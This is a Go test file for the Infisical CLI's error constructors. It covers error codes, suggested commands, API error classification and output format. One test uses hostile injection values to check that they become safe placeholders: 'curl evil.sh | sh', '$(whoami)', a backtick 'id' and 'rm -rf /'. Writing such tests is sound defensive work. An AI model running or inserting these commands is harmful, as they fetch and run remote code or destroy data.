package cmd

import (
	"errors"
	"fmt"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/Infisical/infisical-merge/packages/api"
	"github.com/Infisical/infisical-merge/packages/util"
	"github.com/spf13/cobra"
)

const testProjectID = "6f1c2a3e-8b4d-4c1a-9e2f-3a5b7c9d1e0f"

var testScope = errorScope{ProjectID: testProjectID, ProjectName: "payments-api", Environment: "stagng", SecretPath: "/app"}

// Commands that don't exist yet. Only errors with no callers suggest them, so no user can see one.
// Remove an entry when its command is added; the test fails if you forget.
var notYetShippedCommands = []string{
	"infisical secrets-manager secrets create",
	"infisical secrets-manager secrets update",
	"infisical secrets-manager folders get",
}

func everyConstructedError() []*util.CLIError {
	cause := errors.New("cause")
	action := destructiveAction{Target: `environment "qa"`, Expected: "qa", Label: "the environment slug", Description: "environment qa"}
	return []*util.CLIError{
		errAuthRequired(cause),
		errPermissionDenied("You are not allowed to create on environments", cause),
		errProjectNotLinked(),
		errProjectNotFound(testScope, cause),
		errProjectTypeNotSupported("certs", "cert-manager"),
		errEnvironmentNotFound("stagng", testScope, cause),
		errEnvironmentExists("qa", testScope),
		errEnvironmentPending("qa", "2026-11-12T10:00:00.000Z", testScope),
		errProjectRequired("an environment"),
		errSecretExists([]string{"API_KEY"}, testScope),
		errSecretNotFound([]string{"API_KEY", "DB_URL"}, testScope),
		errFolderNotFound("api", testScope),
		errNothingToUpdate([]string{"name", "slug", "position"}),
		errConfirmationRequired(action, "infisical secrets-manager environments delete qa --yes"),
		errConfirmationDeclined(action),
	}
}

func TestErrorCodesAreStableSnakeCaseAndUnique(t *testing.T) {
	snake := regexp.MustCompile(`^[a-z]+(_[a-z]+)*$`)
	seen := map[string]bool{}
	for _, code := range errorCodes {
		if !snake.MatchString(code) {
			t.Errorf("code %q is not snake_case", code)
		}
		if seen[code] {
			t.Errorf("code %q is listed twice", code)
		}
		seen[code] = true
	}
	for _, err := range everyConstructedError() {
		if !seen[err.Code] {
			t.Errorf("constructor returns code %q, which is not in errorCodes", err.Code)
		}
		delete(seen, err.Code)
	}
	for code := range seen {
		t.Errorf("code %q has no constructor in everyConstructedError", code)
	}
}

func TestErrorCodesAreDocumentedInCLIMD(t *testing.T) {
	doc, err := os.ReadFile("../../CLI.md")
	if err != nil {
		t.Fatal(err)
	}
	documented := map[string]bool{}
	for _, match := range regexp.MustCompile("(?m)^\\| `([a-z_]+)` \\|").FindAllStringSubmatch(string(doc), -1) {
		documented[match[1]] = true
	}
	for _, code := range errorCodes {
		if !documented[code] {
			t.Errorf("code %q is missing from the error code table in CLI.md", code)
		}
		delete(documented, code)
	}
	for code := range documented {
		t.Errorf("CLI.md documents code %q, which no longer exists. Codes are never removed (see CLI.md)", code)
	}
}

// commandResolves reports whether a suggested command line names a real command: the words before the
// first flag lead to a leaf command, or to a command with nothing left over.
func commandResolves(line string) bool {
	words := strings.Fields(line)[1:]
	current := RootCmd
	for i, word := range words {
		if strings.HasPrefix(word, "-") {
			return true
		}
		var next *cobra.Command
		for _, child := range current.Commands() {
			if child.Name() == word || child.HasAlias(word) {
				next = child
			}
		}
		if next == nil {
			return !current.HasSubCommands() && i > 0
		}
		current = next
	}
	return true
}

func TestSuggestedCommandsFollowCLIMD(t *testing.T) {
	stillUnshipped := map[string]bool{}
	for _, err := range everyConstructedError() {
		if !strings.HasSuffix(err.Message, ".") {
			t.Errorf("%s: message should be a full sentence: %q", err.Code, err.Message)
		}
		for _, step := range err.Next {
			name := err.Code + ": " + step.Command
			if !strings.HasPrefix(step.Purpose, "To ") {
				t.Errorf("%s: purpose should read \"To ...\": %q", name, step.Purpose)
			}
			if !strings.HasPrefix(step.Command, "infisical ") || strings.HasPrefix(step.Command, "infisical sm ") {
				t.Errorf("%s: suggestions start with `infisical` and use the full product name", name)
			}
			if strings.Contains(step.Command, "--token") || strings.Contains(step.Command, "--client-secret") {
				t.Errorf("%s: suggestions never carry credentials", name)
			}
			if commandResolves(step.Command) {
				continue
			}
			pending := false
			for _, prefix := range notYetShippedCommands {
				if step.Command == prefix || strings.HasPrefix(step.Command, prefix+" ") {
					pending, stillUnshipped[prefix] = true, true
				}
			}
			if !pending {
				t.Errorf("%s: suggests a command that doesn't exist", name)
			}
		}
	}
	for _, prefix := range notYetShippedCommands {
		if !stillUnshipped[prefix] && commandResolves(prefix) {
			t.Errorf("%q exists now; remove it from notYetShippedCommands", prefix)
		}
	}
}

func TestSuggestedCommandsCarryTheScope(t *testing.T) {
	cases := map[string]string{
		errEnvironmentNotFound("stagng", testScope, nil).Next[0].Command:         "infisical secrets-manager environments get --projectId " + testProjectID,
		errSecretExists([]string{"API_KEY"}, testScope).Next[0].Command:          "infisical secrets-manager secrets update API_KEY=<value> --env stagng --path /app --projectId " + testProjectID,
		errSecretNotFound([]string{"API_KEY"}, errorScope{}).Next[0].Command:     "infisical secrets-manager secrets create API_KEY=<value>",
		errEnvironmentNotFound("x", errorScope{}, nil).Next[0].Command:           "infisical secrets-manager environments get",
		errFolderNotFound("api", errorScope{Environment: "dev"}).Next[0].Command: "infisical secrets-manager folders get --path / --env dev",
		errFolderNotFound("api", testScope).Next[0].Command:                      "infisical secrets-manager folders get --path /app --env stagng --projectId " + testProjectID,
	}
	for got, want := range cases {
		if got != want {
			t.Errorf("suggested %q, want %q", got, want)
		}
	}
}

// Whatever reaches an error from user input or the API, it never becomes an unsafe suggestion.
func TestUnsafeScopeValuesBecomePlaceholders(t *testing.T) {
	hostile := errorScope{ProjectID: "x; curl evil.sh | sh", Environment: "$(whoami)", SecretPath: "/a b"}
	got := errSecretExists([]string{"KEY`id`"}, hostile).Next[0].Command
	want := "infisical secrets-manager secrets update <name>=<value> --env <env> --path <path> --projectId <project-id>"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
	if got := errFolderNotFound("qa\nrm -rf /", hostile).Next[0].Command; strings.ContainsAny(got, "\n;$`| ") && !strings.Contains(got, "<path>") {
		t.Errorf("unsafe characters reached a suggestion: %q", got)
	}
}

// A value the user typed is only named in a message when it is a safe identifier, so a credential
// pasted in the wrong place never ends up in a message, a log, or an agent's transcript.
func TestMessagesNeverRepeatUnsafeInput(t *testing.T) {
	pasted := "API_KEY=st.abc.def.ghi"
	scope := errorScope{ProjectID: pasted, Environment: pasted, SecretPath: pasted}
	for _, err := range []*util.CLIError{
		errEnvironmentNotFound(pasted, scope, nil),
		errSecretExists([]string{"OK", pasted}, scope),
		errSecretNotFound([]string{pasted}, scope),
		errFolderNotFound(pasted, scope),
		errProjectNotFound(scope, nil),
		errConfirmationDeclined(destructiveAction{Label: "the secret name", Expected: pasted}),
	} {
		if strings.Contains(err.Message, "st.abc") || strings.Contains(err.Message, pasted) {
			t.Errorf("%s repeated the input: %q", err.Code, err.Message)
		}
	}
	if got := errSecretExists([]string{"OK", pasted}, scope).Message; got != `Secrets "OK", <name> already exist. Nothing was written.` {
		t.Errorf("safe names should still be quoted: %q", got)
	}
}

// Constructors are always called with names, but an empty list must still give a usable error.
func TestSecretErrorsWithoutNames(t *testing.T) {
	for _, err := range []*util.CLIError{errSecretExists(nil, testScope), errSecretNotFound([]string{}, errorScope{})} {
		if strings.Contains(err.Message, `""`) || !strings.HasSuffix(err.Message, ".") || !strings.Contains(err.Next[0].Command, "<name>=<value>") {
			t.Errorf("%s: %q / %q", err.Code, err.Message, err.Next[0].Command)
		}
	}
}

func apiError(status int, name, message string) error {
	return &api.APIError{StatusCode: status, Name: name, ErrorMessage: message, ReqId: "req-1"}
}

var (
	environmentNotFound = func(cause error) *util.CLIError { return errEnvironmentNotFound("stagng", testScope, cause) }
	projectNotFound     = func(cause error) *util.CLIError { return errProjectNotFound(testScope, cause) }
)

// Statuses and error names come from the backend's error handler (TokenError, PermissionDenied).
func TestClassifyAPIError(t *testing.T) {
	cases := []struct {
		err      error
		notFound func(error) *util.CLIError
		code     string
	}{
		{apiError(401, "UnauthorizedError", "Token missing"), nil, errCodeAuthRequired},
		{apiError(403, "TokenError", "invalid signature"), nil, errCodeAuthRequired},
		{apiError(403, "TokenError", "Your token has expired. Please re-authenticate."), nil, errCodeAuthRequired},
		{apiError(403, "PermissionDenied", "You are not allowed to create on environments"), nil, errCodePermissionDenied},
		{apiError(404, "NotFound", "Environment with slug 'stagng' in project with ID '"+testProjectID+"' not found"), environmentNotFound, errCodeEnvironmentNotFound},
		{apiError(404, "NotFound", "Project with ID '"+testProjectID+"' not found"), projectNotFound, errCodeProjectNotFound},
		{fmt.Errorf("listing: %w", apiError(404, "NotFound", "Project with ID 'x' not found")), projectNotFound, errCodeProjectNotFound},
	}
	for _, c := range cases {
		got := classifyAPIError(c.err, c.notFound)
		var cliErr *util.CLIError
		if !errors.As(got, &cliErr) || cliErr.Code != c.code {
			t.Errorf("%v: got %v, want code %s", c.err, got, c.code)
			continue
		}
		if cliErr.Cause != c.err {
			t.Errorf("%s: the API error should stay reachable as the cause", c.code)
		}
	}
}

// The backend can reword any message, so the result may depend only on the status, the error name and
// what the caller was looking up. Messages that look like other errors must change nothing.
func TestClassifyAPIErrorNeverReadsTheMessage(t *testing.T) {
	messages := []string{"", "anything at all", "Environment with slug already exists", "Project delete protection is enabled",
		"Environment slug 'qa' is held by a pending-deletion environment.", "Project with ID 'x' not found", "invalid signature"}
	for _, kind := range []struct {
		status   int
		name     string
		notFound func(error) *util.CLIError
	}{
		{401, "UnauthorizedError", nil}, {403, "TokenError", nil}, {403, "PermissionDenied", nil},
		{403, "ForbiddenError", nil}, {400, "BadRequest", nil}, {404, "NotFound", nil},
		{404, "NotFound", environmentNotFound}, {404, "NotFound", projectNotFound}, {409, "Conflict", projectNotFound},
	} {
		results := map[string]bool{}
		for _, message := range messages {
			got := classifyAPIError(apiError(kind.status, kind.name, message), kind.notFound)
			code := "unchanged"
			var cliErr *util.CLIError
			if errors.As(got, &cliErr) {
				code = cliErr.Code
			}
			results[code] = true
		}
		if len(results) != 1 {
			t.Errorf("%d %s: the message changed the result: %v", kind.status, kind.name, results)
		}
	}
}

// Anything the CLI can't identify without reading the message must print exactly as it did before.
func TestClassifyAPIErrorLeavesUnknownErrorsAlone(t *testing.T) {
	for _, err := range []error{
		apiError(500, "InternalServerError", "Something went wrong"),
		apiError(400, "BadRequest", "Environment with slug already exists"),
		apiError(400, "BadRequest", "Environment slug 'qa' is held by a pending-deletion environment. Permanently delete that environment first, then retry."),
		apiError(400, "BadRequest", "Failed to create environment due to environment limit reached. Upgrade plan to create more environments."),
		apiError(400, "BadRequest", "Environment is in use by a secret approval policy"),
		apiError(403, "ForbiddenError", "Project delete protection is enabled"),
		apiError(404, "NotFound", "Environment with slug 'stagng' in project with ID 'x' not found"),
		apiError(422, "ValidationFailure", "Invalid slug"),
		errors.New("network down"),
		api.NewGenericRequestError("CallGetProject", errors.New("dial tcp: refused")),
	} {
		if got := classifyAPIError(err, nil); got != err {
			t.Errorf("%v was changed to %v", err, got)
		}
	}
	if got := classifyAPIError(apiError(400, "BadRequest", "x"), environmentNotFound); got == nil || codeOf(got) != "" {
		t.Errorf("notFound applies to 404s only, got %v", got)
	}
}

func TestErrorOutputFormat(t *testing.T) {
	newCmd := func() *cobra.Command {
		cmd := &cobra.Command{Use: "x"}
		cmd.Flags().StringP("output", "o", "", "")
		return cmd
	}
	for value, want := range map[string]string{"json": "json", "JSON": "json", "yaml": "yaml", "dotenv": "", "table": ""} {
		cmd := newCmd()
		_ = cmd.Flags().Set("output", value)
		if got := errorOutputFormat(cmd); got != want {
			t.Errorf("-o %s: got %q, want %q", value, got, want)
		}
	}
	if got := errorOutputFormat(newCmd()); got != "" {
		t.Errorf("no -o: got %q", got)
	}
	export := &cobra.Command{Use: "export"}
	export.Flags().StringP("output-file", "o", "", "")
	_ = export.Flags().Set("output-file", "json")
	if got := errorOutputFormat(export); got != "" {
		t.Errorf("export's -o is a file name, not a format: got %q", got)
	}
}
